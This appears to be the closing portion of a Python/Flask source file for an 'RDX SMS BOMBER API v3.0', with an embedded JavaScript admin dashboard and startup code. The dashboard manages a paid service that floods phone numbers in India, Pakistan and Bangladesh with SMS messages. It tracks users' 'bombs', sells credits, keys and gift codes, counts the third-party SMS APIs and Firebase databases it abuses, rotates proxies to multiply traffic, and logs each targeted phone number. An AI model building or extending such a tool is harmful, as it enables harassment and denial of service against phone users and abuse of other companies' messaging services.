async function init(){ await loadStats(); loadKeys(); loadChannels(); loadGifts(); }

async function refreshAll(){ await loadStats(); toast('Refreshed','ok'); }

async function loadStats(){
  const d = await api('/stats');
  if(!d) return;
  $('st-users').textContent = d.users||0;
  $('st-new24').textContent = `+${d.new24||0} new today`;
  $('st-bombs').textContent = d.bombs||0;
  $('st-keys').textContent = d.keys||0;
  $('st-credits').textContent = d.total_credits||0;
  $('st-premium').textContent = d.premium||0;
  $('st-banned').textContent = d.banned||0;
  $('st-chans').textContent = d.channels||0;
  $('st-proxies').textContent = d.proxies||0;
  // coverage bars (relative to known maxes)
  const indMax=65, fbMax=35, pakMax=5;
  const ind = d.india_sms_apis||0, fb = d.india_firebase_dbs||0, pak = d.pak_sms_apis||0;
  $('cv-ind').textContent = ind;
  $('cv-fb').textContent = fb;
  $('cv-pak').textContent = pak;
  $('bar-ind').style.width = Math.min(ind/indMax*100,100)+'%';
  $('bar-fb').style.width = Math.min(fb/fbMax*100,100)+'%';
  $('bar-pak').style.width = Math.min(pak/pakMax*100,100)+'%';
  const maint = d.maintenance ? '<span class="badge badge-red">ON</span>' : '<span class="badge badge-green">OFF</span>';
  $('sys-info').innerHTML = `
    Firebase: <span style="color:${d.firebase?'var(--green)':'var(--red)'}">●</span> ${d.firebase?'Connected':'Offline'}<br>
    Daily Limit: <code>${d.daily_limit}</code><br>
    Proxy ×: <code>${d.proxy_multiplier}×</code><br>
    BD API: <code>single-url</code><br>
    Maintenance: ${maint}<br>
    Version: <code>${d.version||'3.0'}</code>
  `;
}

async function loadUsers(){
  const rows = await api('/users');
  const tb = $('users-body');
  if(!rows||!rows.length){ tb.innerHTML='<tr><td colspan="7" class="empty">No users found</td></tr>'; return; }
  $('user-count').textContent = `${rows.length} users`;
  tb.innerHTML = rows.slice(0,300).map(u=>`
    <tr>
      <td><code>${u.id}</code></td>
      <td>${E(u.first_name||'')} ${u.username?'<span style="color:var(--muted)">@'+E(u.username)+'</span>':''}</td>
      <td><code>${u.credits||0}</code></td>
      <td><code>${u.total_bombs||0}</code></td>
      <td>${u.is_premium?'<span class="badge badge-blue">💎 Yes</span>':'<span style="color:var(--muted)">—</span>'}</td>
      <td>${u.banned?'<span class="badge badge-red">Banned</span>':'<span class="badge badge-green">Active</span>'}</td>
      <td>
        ${u.banned
          ? `<button class="btn btn-success" style="padding:.3rem .6rem;font-size:.72rem" onclick="modUser('${u.id}','unban')">Unban</button>`
          : `<button class="btn btn-danger" style="padding:.3rem .6rem;font-size:.72rem" onclick="modUser('${u.id}','ban')">Ban</button>`}
        <button class="btn btn-warning" style="padding:.3rem .6rem;font-size:.72rem" onclick="addCredits('${u.id}')">+Credits</button>
      </td>
    </tr>`).join('');
}
async function findUser(){
  const uid = $('uid-search').value.trim();
  if(!uid) return;
  const rows = await api('/users');
  const u = rows.find(x=>String(x.id)===uid);
  const d = $('user-detail');
  if(!u){ d.style.display='block'; d.innerHTML='<span style="color:var(--red)">User not found</span>'; return; }
  d.style.display = 'block';
  d.innerHTML = `<b>ID:</b> <code>${u.id}</code> &nbsp; <b>Name:</b> ${E(u.first_name)} &nbsp; <b>Credits:</b> <code>${u.credits||0}</code> &nbsp; <b>Bombs:</b> <code>${u.total_bombs||0}</code> &nbsp; <b>Premium:</b> ${u.is_premium?'✅':'❌'} &nbsp; <b>Banned:</b> ${u.banned?'🚫':'✅'}
  <div class="flex-row" style="margin-top:.5rem">
    ${u.banned
      ? `<button class="btn btn-success" onclick="modUser('${u.id}','unban');findUser()">Unban</button>`
      : `<button class="btn btn-danger" onclick="modUser('${u.id}','ban');findUser()">Ban</button>`}
    <button class="btn btn-warning" onclick="addCredits('${u.id}')">+Credits</button>
    ${u.is_premium
      ? `<button class="btn btn-muted" onclick="modPrem('${u.id}',false)">Remove Premium</button>`
      : `<button class="btn btn-muted" onclick="modPrem('${u.id}',true)">Make Premium</button>`}
  </div>`;
}
async function modUser(uid, action){ const r = await api('/users/'+uid+'/'+action,'POST'); toast(r.success?'Done':'Error', r.success?'ok':'err'); loadUsers(); }
async function addCredits(uid){ const amt=prompt('Credits to add:'); if(!amt||isNaN(amt))return; const r=await api('/users/'+uid+'/credits','POST',{amount:parseInt(amt)}); toast(r.success?'+'+amt+' credits added':'Error',r.success?'ok':'err'); loadUsers(); }
async function modPrem(uid,val){ await api('/users/'+uid+'/premium','POST',{premium:val}); toast('Updated','ok'); findUser(); }

async function loadKeys(){
  const rows = await api('/keys');
  const tb = $('keys-body');
  const now = Date.now()/1000;
  if(!rows||!rows.length){ tb.innerHTML='<tr><td colspan="6" class="empty">No keys yet</td></tr>'; return; }
  tb.innerHTML = rows.map(k=>{
    const active = !k.revoked && k.expires_at > now;
    const badge = k.revoked ? '<span class="badge badge-red">Revoked</span>' : (active ? '<span class="badge badge-green">Active</span>' : '<span class="badge badge-yellow">Expired</span>');
    return `<tr>
      <td><code style="font-size:.72rem">${E(k.key)}</code></td>
      <td><code>${k.user_id}</code></td>
      <td>${E(k.plan||'—')}</td>
      <td>${fmtDate(k.expires_at)}</td>
      <td>${badge}</td>
      <td><button class="btn btn-danger" style="padding:.3rem .6rem;font-size:.72rem" onclick="revokeKey('${E(k.key)}')">Revoke</button></td>
    </tr>`;
  }).join('');
}
async function genKey(){
  const uid=$('key-uid').value.trim(), days=parseInt($('key-days').value)||30;
  if(!uid){ toast('Enter user ID','err'); return; }
  const d = await api('/keys','POST',{user_id:uid,days});
  const el = $('key-result');
  el.style.display='block';
  el.textContent = d.success ? '✅ Key: ' + d.key : '❌ ' + d.error;
  if(d.success){ toast('Key generated','ok'); loadKeys(); }
  else toast(d.error,'err');
}
async function revokeKey(key){ if(!confirm('Revoke this key?'))return; const r=await api('/keys/'+encodeURIComponent(key),'DELETE'); toast(r.success?'Key revoked':'Error',r.success?'ok':'err'); loadKeys(); }

async function loadChannels(){
  const rows = await api('/channels');
  const tb = $('ch-body');
  if(!rows||!rows.length){ tb.innerHTML='<tr><td colspan="4" class="empty">No channels</td></tr>'; return; }
  tb.innerHTML = rows.map(c=>`<tr>
    <td><code>${E(c.chat_id||c.id)}</code></td>
    <td>${E(c.title||'—')}</td>
    <td>${c.link?`<a href="${E(c.link)}" target="_blank" style="color:var(--purple);font-size:.75rem">${E(c.link.substring(0,40))}…</a>`:'—'}</td>
    <td><button class="btn btn-danger" style="padding:.3rem .6rem;font-size:.72rem" onclick="delChannel('${E(c.chat_id||c.id)}')">Remove</button></td>
  </tr>`).join('');
}
async function addChannel(){
  const id=$('ch-id').value.trim(), title=$('ch-title').value.trim(), link=$('ch-link').value.trim();
  if(!id){ toast('Enter chat ID','err'); return; }
  const r = await api('/channels','POST',{chat_id:id,title,link});
  toast(r.success?'Channel added':'Error', r.success?'ok':'err');
  loadChannels();
  ['ch-id','ch-title','ch-link'].forEach(i=>$(i).value='');
}
async function delChannel(id){ if(!confirm('Remove channel?'))return; await api('/channels/'+encodeURIComponent(id),'DELETE'); toast('Removed','ok'); loadChannels(); }

async function loadGifts(){
  const rows = await api('/gift');
  const tb = $('gift-body');
  const now = Date.now()/1000;
  if(!rows||!rows.length){ tb.innerHTML='<tr><td colspan="6" class="empty">No gift codes</td></tr>'; return; }
  tb.innerHTML = rows.map(g=>{
    const expired = g.expires_at && g.expires_at < now;
    return `<tr>
      <td><code style="font-size:.72rem">${E(g.code)}</code></td>
      <td><code>${g.credits}</code></td>
      <td>${g.claimed_count||0} / ${g.max_users||'∞'}</td>
      <td>${g.is_premium?'<span class="badge badge-blue">💎 Yes</span>':'—'}</td>
      <td>${g.expires_at?(expired?'<span class="badge badge-red">Expired</span>':fmtDate(g.expires_at)):'Never'}</td>
      <td><button class="btn btn-danger" style="padding:.3rem .6rem;font-size:.72rem" onclick="delGift('${E(g.code)}')">Delete</button></td>
    </tr>`;
  }).join('');
}
async function createGift(){
  const credits=parseInt($('g-credits').value)||0;
  const max_users=parseInt($('g-users').value)||0;
  const days_valid=parseInt($('g-days').value)||7;
  const is_premium=$('g-prem').checked;
  if(!credits){ toast('Enter credits','err'); return; }
  const d = await api('/gift','POST',{credits,max_users,days_valid,is_premium});
  const el = $('gift-result');
  el.style.display='block';
  el.textContent = d.success ? '✅ ' + d.code : '❌ ' + d.error;
  if(d.success){ toast('Gift code created','ok'); loadGifts(); }
  else toast(d.error,'err');
}
async function delGift(code){ if(!confirm('Delete gift code?'))return; await api('/gift/'+encodeURIComponent(code),'DELETE'); toast('Deleted','ok'); loadGifts(); }

async function loadSettings(){
  const d = await api('/settings');
  if(!d) return;
  $('set-limit').value = d.daily_limit||500;
  $('tog-maintenance').checked = !!d.maintenance;
  $('settings-info').innerHTML = `Daily limit: <code>${d.daily_limit}</code><br>
    Rate limit: <code>${d.rate_limit_max}/${d.rate_limit_window}s</code><br>
    Proxy ×: <code>${d.proxy_multiplier}×</code><br>
    Maintenance: ${d.maintenance?'<span class="badge badge-red">ON</span>':'<span class="badge badge-green">OFF</span>'}`;
}
async function saveLimit(){ const lim=parseInt($('set-limit').value); if(!lim)return; const r=await api('/settings','POST',{daily_limit:lim}); toast(r.success?'Saved':'Error',r.success?'ok':'err'); }
async function toggleMaintenance(){ const on=$('tog-maintenance').checked; const r=await api('/settings','POST',{maintenance:on}); toast(`Maintenance ${on?'ON':'OFF'}`,on?'info':'ok'); }

async function loadProxies(){
  const d = await api('/proxies');
  $('proxy-info').innerHTML = d ? `
    <div class="stat-grid" style="margin-bottom:1rem">
      <div class="stat-card blue"><div class="stat-v">${d.count||0}</div><div class="stat-l">Loaded Proxies</div></div>
      <div class="stat-card purple"><div class="stat-v">${d.multiplier||0}×</div><div class="stat-l">Multiplier</div></div>
    </div>
    <div style="font-size:.8rem;color:var(--dim);margin-bottom:.5rem">Proxy rotation: <span style="color:${d.enabled?'var(--green)':'var(--red)'}">${d.enabled?'Enabled':'Disabled'}</span></div>
    ${d.sample&&d.sample.length?'<div style="font-size:.75rem;color:var(--muted);margin-top:.5rem">Sample proxies (first 5):</div>'+'<div style="font-family:monospace;font-size:.72rem;color:var(--dim);margin-top:.25rem">'+d.sample.map(s=>E(s)).join('<br>')+'</div>':'<div style="color:var(--muted)">No proxies loaded. Add Proxies.txt to the working directory.</div>'}
  ` : 'Error loading proxy info.';
}

async function loadBombLog(){
  const rows = await api('/bomb-log');
  const tb = $('bomb-log-body');
  if(!rows||!rows.length){ tb.innerHTML='<tr><td colspan="6" class="empty">No bomb activity yet</td></tr>'; return; }
  const flags = {india:'🇮🇳',bangladesh:'🇧🇩',pakistan:'🇵🇰'};
  tb.innerHTML = rows.map((r,i)=>`<tr>
    <td style="color:var(--muted)">${i+1}</td>
    <td>${flags[r.country]||''} ${E(r.country||'')}</td>
    <td><span class="badge badge-purple">${E(r.mode||'')}</span></td>
    <td><code>${E(r.number||'')}</code></td>
    <td>${r.sent||0} / ${r.total||0}</td>
    <td style="color:var(--muted);font-size:.72rem">${fmtTime(r.ts)}</td>
  </tr>`).join('');
}

async function doImport(){
  const raw = $('import-json').value.trim();
  if(!raw) return;
  try{
    const data = JSON.parse(raw);
    const d = await api('/import','POST',data);
    const el = $('import-result');
    el.style.display='block';
    el.className = d.success ? 'ok' : 'err';
    el.textContent = d.success ? `✅ Imported ${d.imported} users` : '❌ ' + d.error;
    if(d.success) toast('Import complete','ok');
  } catch(e){
    $('import-result').style.display='block';
    $('import-result').className='err';
    $('import-result').textContent='❌ Invalid JSON: ' + e.message;
  }
}
async function doExport(){
  const d = await api('/export');
  const blob = new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'Rdx_export_v3.json';
  a.click();
  toast('Export downloaded','ok');
}

// Health check ping
async function ping(){
  try{
    const r = await fetch('/health');
    const ok = r.ok;
    $('status-dot').style.background = ok ? 'var(--green)' : 'var(--red)';
    $('status-txt').textContent = ok ? 'Online' : 'Degraded';
  } catch{ $('status-dot').style.background='var(--red)'; $('status-txt').textContent='Offline'; }
}
ping(); setInterval(ping, 30000);
</script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════════
#  STARTUP
# ═══════════════════════════════════════════════════════════════
def _startup():
    init_sqlite()
    load_proxies()
    print(f"""
{'='*60}
  ✅ RDX SMS BOMBER API v3.0 STARTED
  🌐 Home:    {BASE_URL}/
  📊 Admin:   {BASE_URL}/admin
  ❤  Health:  {BASE_URL}/health
  🔌 Port:    {PORT}
  🇮🇳 India: {len(INDIA_SMS_APIS)} APIs + {len(INDIA_FIREBASE_DBS)} Firebase DBs + Custom
  🇧🇩 BD:    RDX BD API x {PROXY_MULTIPLIER} proxies
  🇵🇰 PAK:   {len(PAK_SMS_APIS)} APIs  |  Mult: {PROXY_MULTIPLIER}x
  🔥 Firebase: {"YES" if _db else "NO"}  |  SQLite: {SQLITE_PATH}
  🔀 Proxies:  {len(_proxies)} loaded
{'='*60}
""", flush=True)
    try:
        import bot as _bot
        _bot.start_bot(PORT)
    except ImportError:
        print("[WARN] bot.py not found — Telegram bot disabled", flush=True)
    except Exception as e:
        print(f"[WARN] Bot startup error: {e}", flush=True)

_startup()

def main():
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)

if __name__ == "__main__":
    main()
